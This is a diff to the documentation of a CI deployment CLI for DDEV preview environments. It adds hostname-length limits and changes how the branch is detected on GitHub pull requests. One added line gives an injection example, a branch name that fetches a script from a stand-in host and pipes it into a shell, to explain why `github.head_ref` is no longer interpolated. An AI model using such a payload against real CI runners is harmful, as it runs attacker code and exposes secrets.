@@ -25,6 +25,7 @@ This file can be older or newer than the CLI that your CI runs. `trafic skill` p
 
 - `--name` is the DDEV project name. Use lowercase letters, digits and hyphens: the name is a hostname label.
 - `--preview <iid>` changes the project name to `preview-<iid>--<name>`. Pass the same `--name` and `--preview` to `deploy` and `destroy`.
+- The project name, with its `preview-<iid>--` prefix, must be 63 characters or less. It is the first label of the hostname, and Let's Encrypt refuses a longer label. Keep `--name` short.
 - The URL is `https://<project name>.<tld>`, for example `https://preview-42--my-app.previews.example.com`. The `<tld>` is the `--tld` of `trafic setup`.
 - The project directory on the server is `<projects-dir>/<project name>`, by default `~/www/<project name>` (`/home/ddev/www/...`).
 
@@ -52,7 +53,7 @@ Steps on the server, in this order:
 | `--host` | SSH host (required) |
 | `--name` | Project name (required) |
 | `--preview <iid>` | MR or PR number. The project becomes `preview-<iid>--<name>` |
-| `--branch` | Branch to clone. Default: `$CI_COMMIT_REF_NAME` or `$GITHUB_REF_NAME` |
+| `--branch` | Branch to clone. Default: `$CI_COMMIT_REF_NAME`, `$GITHUB_HEAD_REF` or `$GITHUB_REF_NAME` |
 | `--repo` | Repository URL. Default: `$CI_REPOSITORY_URL`, or `$GITHUB_SERVER_URL/$GITHUB_REPOSITORY.git` |
 | `--sync <paths>` | Comma-separated local paths to send: build output, `vendor`. Nothing is sent without it |
 | `--script <cmd>` | Command inside the web container (`composer install`, `wp cache flush`, migrations) |
@@ -162,7 +163,7 @@ destroy_preview:
     action: stop
 ```
 
-- `$CI_PROJECT_PATH_SLUG` is a safe `--name`: lowercase, hyphens only.
+- `$CI_PROJECT_PATH_SLUG` is lowercase with hyphens only, but it can have 63 characters. If `preview-<iid>--$CI_PROJECT_PATH_SLUG` can be longer than 63 characters, give `--name` a short fixed value, such as `my-app`.
 - The build job must pass its output to `deploy_preview` (`artifacts` and `needs`), or `--sync` fails.
 - For a branch or main deploy without `--preview`, set `--name` and `--branch` and use another rule.
 
@@ -190,7 +191,6 @@ jobs:
           --host ${{ vars.SSH_HOST }}
           --name ${{ github.event.repository.name }}
           --preview ${{ github.event.pull_request.number }}
-          --branch ${{ github.head_ref }}
           --sync "dist/"
 
   destroy_preview:
@@ -209,7 +209,7 @@ jobs:
           --preview ${{ github.event.pull_request.number }}
 ```
 
-- Always pass `--branch ${{ github.head_ref }}` on `pull_request` events. There, `GITHUB_REF_NAME` is `<number>/merge`, which the server cannot clone.
+- On `pull_request` events, `trafic deploy` reads the branch from `$GITHUB_HEAD_REF`. Do not pass `--branch ${{ github.head_ref }}`: GitHub writes the value into the script before the shell runs it, so a branch name such as `x$(curl${IFS}evil|sh)` runs commands on the runner. When a `run:` step needs such a value, set it in `env:` and use the shell variable (`"$HEAD_REF"`).
 - `ssh-agent` is safe on GitHub Actions. The GitLab warning does not apply.
 - If the repository name has capitals, dots or underscores, give `--name` a lowercase value with hyphens.
 
@@ -219,7 +219,7 @@ jobs:
 |---|---|
 | `Option '--ssh-options' argument is ambiguous` | The value starts with a dash. Write `--ssh-options="-i key ..."` with `=` |
 | `Permission denied (publickey)` | The CI key is not in `/home/ddev/.ssh/authorized_keys`, or the SSH user is not in `--ssh-users` of setup. SSH runs in batch mode and cannot ask for a password |
-| `Missing --branch and could not detect from CI environment` | Pass `--branch`. Also pass it on GitHub `pull_request` events (see above) |
+| `Missing --branch and could not detect from CI environment` | Pass `--branch` |
 | `Cannot sync "<path>": no such file or directory. Did the build produce it?` | The build did not run in this job, or its artifacts did not reach it. Fix `artifacts`/`needs`, or the path |
 | `Command failed: rsync (exit code ENOENT)` | `rsync` is not installed on the runner. Install it before the deploy |
 | `trafic-agent: command not found` at "Cancel a scheduled removal", or `trafic-agent is not on the PATH of ...` | The agent is not installed on the server, or not on the PATH of the SSH user. Run `trafic setup`, and connect as `ddev` |
